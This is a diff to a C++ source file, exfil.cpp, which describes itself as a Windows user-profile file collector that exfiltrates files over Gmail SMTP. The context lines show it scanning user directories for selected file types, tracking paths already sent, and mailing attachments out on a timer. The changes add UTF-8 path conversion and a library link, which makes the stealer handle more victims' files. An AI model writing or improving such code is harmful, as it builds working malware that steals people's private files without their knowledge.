@@ -1,5 +1,5 @@
 // exfil.cpp — Windows user-profile file collector + Gmail SMTP exfil
-// build: cl /EHsc /O2 /std:c++17 /Fe:app.exe exfil.cpp ws2_32.lib secur32.lib crypt32.lib
+// build: cl /EHsc /O2 /std:c++17 /Fe:app.exe exfil.cpp ws2_32.lib secur32.lib crypt32.lib advapi32.lib
 #define SECURITY_WIN32
 #define WIN32_LEAN_AND_MEAN
 
@@ -24,6 +24,7 @@
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "secur32.lib")
 #pragma comment(lib, "crypt32.lib")
+#pragma comment(lib, "advapi32.lib")
 
 // ======================= CONFIG =======================
 static const char* MAIL_FROM = "sender@gmail.com";
@@ -33,6 +34,18 @@ static const DWORD SLEEP_BETWEEN_MAILS_MS = 30000;
 static const DWORD SLEEP_SCAN_MS = 600000;
 static const size_t MAX_ATTACH = 18u * 1024 * 1024;
 // ======================================================
+
+// ---------- wstring -> utf8 string ----------
+static std::string to_utf8(const std::wstring& w) {
+    if (w.empty()) return std::string();
+    int need = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(),
+                                   nullptr, 0, nullptr, nullptr);
+    if (need <= 0) return std::string();
+    std::string out((size_t)need, '\0');
+    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(),
+                        &out[0], need, nullptr, nullptr);
+    return out;
+}
 
 // ---------- base64 ----------
 static std::string b64(const unsigned char* d, size_t n) {
@@ -102,7 +115,8 @@ struct TlsSock {
 
         bool done = false;
         while (!done) {
-            SecBuffer out{}; out.BufferType = SECBUFFER_TOKEN; out.cbBuffer = 0; out.pvBuffer = nullptr;
+            SecBuffer out{};
+            out.BufferType = SECBUFFER_TOKEN; out.cbBuffer = 0; out.pvBuffer = nullptr;
             SecBufferDesc outd{ SECBUFFER_VERSION, 1, &out };
             DWORD flags = req;
             SECURITY_STATUS ss = InitializeSecurityContextA(&cred,
@@ -279,7 +293,6 @@ struct Smtp {
         }
         msg += "--" + boundary + "--\r\n";
 
-        // dot-stuffing
         std::string out; out.reserve(msg.size() + 16);
         size_t pos = 0;
         while (pos < msg.size()) {
@@ -336,7 +349,7 @@ static void collect(const std::wstring& dir, std::vector<std::wstring>& out, int
             sz.LowPart = fd.nFileSizeLow;
             sz.HighPart = (LONG)fd.nFileSizeHigh;
             if (sz.QuadPart > 0 && sz.QuadPart < (LONGLONG)MAX_ATTACH) {
-                std::string a(full.begin(), full.end());
+                std::string a = to_utf8(full);
                 if (interesting_ext(ext_of(a))) out.push_back(full);
             }
         }
@@ -406,7 +419,7 @@ int main() {
 
         for (size_t i = 0; i < files.size(); ++i) {
             const std::wstring& f = files[i];
-            std::string a(f.begin(), f.end());
+            std::string a = to_utf8(f);
             if (sent_paths.count(a)) continue;
 
             std::string data = read_file(f);
